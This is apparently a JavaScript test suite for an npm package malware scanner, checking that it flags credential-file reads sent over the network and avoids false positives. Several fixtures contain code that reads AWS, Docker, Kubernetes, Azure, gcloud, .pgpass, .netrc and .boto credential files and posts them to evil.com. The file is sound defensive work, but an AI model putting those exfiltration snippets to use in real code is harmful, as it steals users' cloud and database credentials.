const fs = require('fs');
const os = require('os');
const path = require('path');
const { asyncTest, assert, runScanDirect, cleanupTemp } = require('../test-utils');

function makeTempPkg(jsContent, fileName = 'index.js') {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-sensfiles-'));
  fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-pkg', version: '1.0.0' }));
  fs.writeFileSync(path.join(tmp, fileName), jsContent);
  return tmp;
}

async function runSensitiveFilesCoverageTests() {
  console.log('\n=== F5: SENSITIVE_FILES_COVERAGE TESTS ===\n');

  // ── Dataflow taint: each new path read + exfil = suspicious_dataflow ──

  await asyncTest('F5: fs.readFileSync(".aws/credentials") + fetch → suspicious_dataflow', async () => {
    const tmp = makeTempPkg(`
const fs = require('fs');
const creds = fs.readFileSync('/home/user/.aws/credentials', 'utf8');
fetch('http://evil.com', { body: creds });
`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(t, 'taint must propagate from .aws/credentials read to fetch sink');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('F5: fs.readFileSync(".docker/config.json") + fetch → suspicious_dataflow', async () => {
    const tmp = makeTempPkg(`
const fs = require('fs');
const cfg = fs.readFileSync('/home/user/.docker/config.json', 'utf8');
fetch('http://evil.com', { body: cfg });
`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(t, 'taint must propagate from .docker/config.json read to fetch sink');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('F5: fs.readFileSync(".kube/config") + fetch → suspicious_dataflow', async () => {
    const tmp = makeTempPkg(`
const fs = require('fs');
const k = fs.readFileSync('/home/user/.kube/config', 'utf8');
fetch('http://evil.com', { body: k });
`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(t, 'taint must propagate from .kube/config read to fetch sink');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('F5: fs.readFileSync(".pgpass") + fetch → suspicious_dataflow', async () => {
    const tmp = makeTempPkg(`
const fs = require('fs');
const pg = fs.readFileSync('/home/user/.pgpass', 'utf8');
fetch('http://evil.com', { body: pg });
`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(t, 'taint must propagate from .pgpass read to fetch sink');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('F5: fs.readFileSync(".netrc") + fetch → suspicious_dataflow', async () => {
    const tmp = makeTempPkg(`
const fs = require('fs');
const n = fs.readFileSync('/home/user/.netrc', 'utf8');
fetch('http://evil.com', { body: n });
`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(t, 'taint must propagate from .netrc read to fetch sink');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('F5: fs.readFileSync(".boto") + fetch → suspicious_dataflow', async () => {
    const tmp = makeTempPkg(`
const fs = require('fs');
const b = fs.readFileSync('/home/user/.boto', 'utf8');
fetch('http://evil.com', { body: b });
`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(t, 'taint must propagate from .boto read to fetch sink');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('F5: fs.readFileSync(".azure/credentials") + fetch → suspicious_dataflow', async () => {
    const tmp = makeTempPkg(`
const fs = require('fs');
const az = fs.readFileSync('/home/user/.azure/credentials', 'utf8');
fetch('http://evil.com', { body: az });
`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(t, 'taint must propagate from .azure/credentials read to fetch sink');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('F5: fs.readFileSync(".gcloud/credentials.db") + fetch → suspicious_dataflow', async () => {
    const tmp = makeTempPkg(`
const fs = require('fs');
const g = fs.readFileSync('/home/user/.gcloud/credentials.db', 'utf8');
fetch('http://evil.com', { body: g });
`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(t, 'taint must propagate from .gcloud/credentials.db read to fetch sink');
    } finally { cleanupTemp(tmp); }
  });

  // ── Sensitive string literal detection (narrow, FP-conservative additions) ──

  await asyncTest('F5: literal ".aws/credentials" in code triggers sensitive_string HIGH', async () => {
    const tmp = makeTempPkg(`const path = "/home/user/.aws/credentials"; console.log(path);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t =>
        t.type === 'sensitive_string' && t.message.includes('.aws/credentials')
      );
      assert(t, 'sensitive_string must fire on literal ".aws/credentials"');
      assert(t.severity === 'HIGH', 'severity must be HIGH');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('F5: literal ".docker/config.json" triggers sensitive_string HIGH', async () => {
    const tmp = makeTempPkg(`const p = "/home/user/.docker/config.json"; console.log(p);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t =>
        t.type === 'sensitive_string' && t.message.includes('.docker/config.json')
      );
      assert(t, 'sensitive_string must fire on literal ".docker/config.json"');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('F5: literal ".kube/config" triggers sensitive_string HIGH', async () => {
    const tmp = makeTempPkg(`const p = "/home/user/.kube/config"; console.log(p);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t =>
        t.type === 'sensitive_string' && t.message.includes('.kube/config')
      );
      assert(t, 'sensitive_string must fire on literal ".kube/config"');
    } finally { cleanupTemp(tmp); }
  });

  // ── FP-conservative: narrow patterns NOT added to SENSITIVE_STRINGS ──
  // (legit JS DB clients reference .pgpass/.netrc/.boto by name)

  await asyncTest('F5: literal ".pgpass" alone does NOT trigger sensitive_string (legit DB client refs)', async () => {
    const tmp = makeTempPkg(`const cfg = "~/.pgpass"; console.log(cfg);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t =>
        t.type === 'sensitive_string' && t.message && t.message.includes('.pgpass')
      );
      assert(!t, '.pgpass must only trigger via dataflow taint, not as a bare literal');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('F5: literal ".netrc" alone does NOT trigger sensitive_string (legit HTTP clients ref)', async () => {
    const tmp = makeTempPkg(`const cfg = "~/.netrc"; console.log(cfg);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t =>
        t.type === 'sensitive_string' && t.message && t.message.includes('.netrc')
      );
      assert(!t, '.netrc must only trigger via dataflow taint, not as a bare literal');
    } finally { cleanupTemp(tmp); }
  });

  // ── Regression: legit local config read without exfil = no alert ──

  await asyncTest('F5: reading own package.json without exfil does NOT trigger suspicious_dataflow', async () => {
    const tmp = makeTempPkg(`
const fs = require('fs');
const cfg = fs.readFileSync('./package.json', 'utf8');
console.log(cfg);
`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(!t, 'reading own package.json must not trigger suspicious_dataflow');
    } finally { cleanupTemp(tmp); }
  });
}

module.exports = { runSensitiveFilesCoverageTests };
